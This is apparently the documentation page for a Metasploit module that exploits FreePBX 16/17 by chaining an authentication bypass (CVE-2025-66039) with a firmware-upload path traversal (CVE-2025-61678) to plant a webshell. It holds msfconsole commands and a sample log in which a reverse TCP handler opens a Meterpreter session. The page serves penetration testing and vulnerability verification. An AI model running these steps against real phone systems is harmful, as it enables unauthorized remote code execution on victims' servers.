## Vulnerable Application

FreePBX is an open-source IP PBX management tool that provides a modern phone system for businesses
that use VoIP to make and receive phone calls. Versions 16.0.44 and 17.0.23 are vulnerable to
multiple CVEs, specifically CVE-2025-66039 and CVE-2025-61678, in the context of this module. The
former represents an authentication bypass: when FreePBX uses Webserver Authorization Mode
(an option the admin can enable), it allows an attacker to authenticate as any user. The latter
allows unrestricted file uploads via firmware upload, including path traversal. These vulnerabilities
allow unauthenticated remote code execution by bypassing authentication and placing a webshell in the
web serverâ€™s directory.

To setup the environment, perform minimal installation from [here](https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso). Note that **Authorization Type** needs to be set to **webserver**:

1. Login into FreePBX Administration
1. Settings -> Advanced Settings
1. Change **Authorization Type** to **webserver**

## Verification Steps

1. Install FreePBX
1. Start msfconsole
1. Do: `use unix/http/freepbx_firmware_file_upload`
1. Do: `set RHOSTS [target IP address]`
1. Do: `set USERNAME [FreePBX user]`
1. Do: `set LHOST [attacker IP]`
1. Do: `run`
1. You should get a shell.

## Options

### USERNAME

Performing authentication bypass requires the username of an existing user.
This username is used in the Authorization header along with a random password.


## Scenarios


```
msf exploit(unix/http/freepbx_firmware_file_upload) > run verbose=true
[*] Started reverse TCP handler on 192.168.168.128:4242 
[*] Trying to bypass authentication
[+] Bypass successful, trying upload webshell
[+] Upload successful, triggering..
[*] Sending stage (41224 bytes) to 192.168.168.223
[*] Meterpreter session 9 opened (192.168.168.128:4242 -> 192.168.168.223:47616) at 2026-01-06 12:55:19 +0100
[!] This exploit may require manual cleanup of 'qin7.php' on the target

meterpreter  >
```

